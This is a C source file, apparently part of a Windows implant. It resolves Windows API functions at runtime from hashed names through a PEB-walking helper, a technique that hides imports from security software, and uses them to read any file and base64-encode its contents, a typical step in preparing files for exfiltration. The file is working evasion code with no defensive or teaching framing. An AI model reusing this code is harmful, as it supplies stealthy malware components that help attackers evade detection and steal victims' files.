#include "commun.h"
#include "getaddress.h"

#define CryptBinaryToStringW_h  0xdc1c8f87
#define malloc_h                0xfff88bb7
#define CryptBinaryToStringA_h  0xdc1c8f71
#define free_h                  0x4337e881
#define CreateFileW_h           0x3ae5c0ca
#define GetFileSize_h           0xc7e0bfda
#define CloseHandle_h           0x87bfc4c1
#define ReadFile_h                0xef1fe1b



typedef BOOL (WINAPI* CryptBinaryToStringW_t)(
    const BYTE* pbBinary,
    DWORD      cbBinary,
    DWORD      dwFlags,
    LPWSTR     pszString,
    DWORD* pcchString
);

typedef BOOL (WINAPI* CryptBinaryToStringA_t)(
    const BYTE* pbBinary,
    DWORD      cbBinary,
    DWORD      dwFlags,
    LPSTR      pszString,
    DWORD* pcchString
);

typedef void* (WINAPI* malloc_t)(
    size_t size
);

typedef void (WINAPI* free_t)(
    void* memblock
);

typedef HANDLE (WINAPI* CreateFileW_t)(
    LPCWSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef DWORD (WINAPI* GetFileSize_t)(
    HANDLE  hFile,
    LPDWORD lpFileSizeHigh
);

typedef BOOL (WINAPI* CloseHandle_t)(
    HANDLE hObject
);

typedef BOOL (WINAPI* ReadFile_t)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);




char* base64_encode(const BYTE* data, DWORD data_len) {
    DWORD encoded_len;
    char* encoded_data;

    CryptBinaryToStringW_t CryptBinaryToStringWFunc = (CryptBinaryToStringW_t)PEBGetAddr(CryptBinaryToStringW_h);
    CryptBinaryToStringA_t CryptBinaryToStringAFunc = (CryptBinaryToStringA_t)PEBGetAddr(CryptBinaryToStringA_h);

    malloc_t mallocFunc = (malloc_t)PEBGetAddr(malloc_h);
    free_t freeFunc = (free_t)PEBGetAddr(free_h);

    // Get the length of the base64 encoded data
    if (!CryptBinaryToStringWFunc(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_len)) {
        _tprintf(_T("Failed to get encoded length (error %d)\n"), GetLastError());
        return NULL;
    }

    // Allocate memory for the encoded data
    encoded_data = (char*)mallocFunc(encoded_len);
    if (encoded_data == NULL) {
        _tprintf(_T("Failed to allocate memory for encoded data\n"));
        return NULL;
    }

    // Perform base64 encoding
    if (!CryptBinaryToStringAFunc(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded_data, &encoded_len)) {
        _tprintf(_T("Failed to encode data (error %d)\n"), GetLastError());
        freeFunc(encoded_data);
        return NULL;
    }

    return encoded_data;
}



char* encode_file_base64(const _TCHAR* filepath) {
    HANDLE hFile;
    DWORD fileSize, bytesRead;
    BYTE* fileBuffer;
    char* base64Buffer;

    CreateFileW_t CreateFileWFunc = (CreateFileW_t)PEBGetAddr(CreateFileW_h);
    GetFileSize_t GetFileSizeFunc = (GetFileSize_t)PEBGetAddr(GetFileSize_h);
    CloseHandle_t CloseHandleFunc = (CloseHandle_t)PEBGetAddr(CloseHandle_h);
    malloc_t mallocFunc = (malloc_t)PEBGetAddr(malloc_h);
    free_t freeFunc = (free_t)PEBGetAddr(free_h);
    ReadFile_t ReadFileFunc = (ReadFile_t)PEBGetAddr(ReadFile_h);

    // Open the file for reading
    hFile = CreateFileWFunc(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _tprintf(_T("Could not open file (error %d)\n"), GetLastError());
        return NULL;
    }

    // Get the file size
    fileSize = GetFileSizeFunc(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        _tprintf(_T("Could not get file size (error %d)\n"), GetLastError());
        CloseHandleFunc(hFile);
        return NULL;
    }

    // Allocate space for the file content
    fileBuffer = (BYTE*)mallocFunc(fileSize);
    if (fileBuffer == NULL) {
        _tprintf(_T("Could not allocate memory for file buffer\n"));
        CloseHandleFunc(hFile);
        return NULL;
    }

    // Read the file content into the buffer
    if (ReadFileFunc(hFile, fileBuffer, fileSize, &bytesRead, NULL) == FALSE) {
        _tprintf(_T("Could not read file (error %d)\n"), GetLastError());
        freeFunc(fileBuffer);
        CloseHandleFunc(hFile);
        return NULL;
    }

    // Close the file handle as it is no longer needed
    CloseHandleFunc(hFile);

    // Convert the file content to base64
    base64Buffer = base64_encode(fileBuffer, fileSize); // Assuming you have a base64_encode implementation

    // Free the file buffer
    freeFunc(fileBuffer);

    // Return the base64-encoded string
    return base64Buffer;
}
